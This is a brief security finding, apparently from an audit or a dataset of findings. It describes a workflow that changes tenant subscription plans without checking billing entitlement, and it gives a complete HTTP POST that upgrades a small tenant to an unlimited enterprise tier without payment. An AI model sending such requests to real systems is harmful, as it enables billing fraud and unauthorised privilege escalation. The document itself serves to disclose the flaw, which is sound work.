diagnosis: The Temporal activity applies subscription plan and seat limit changes to tenant_subscriptions using parameters supplied in the workflow input. When this workflow can be scheduled via customer-facing API routes or message brokers without validating billing entitlement, any tenant can upgrade their subscription plan to ENTERPRISE without payment.
exploit_request:
POST /api/workflows/subscription/upgrade HTTP/1.1
Host: billing.orchestration.net
Authorization: Bearer <tenant_jwt>
Content-Type: application/json

{"tenantId": "tnt_small_startup", "newPlanTier": "ENTERPRISE_UNLIMITED", "maxSeats": 5000}
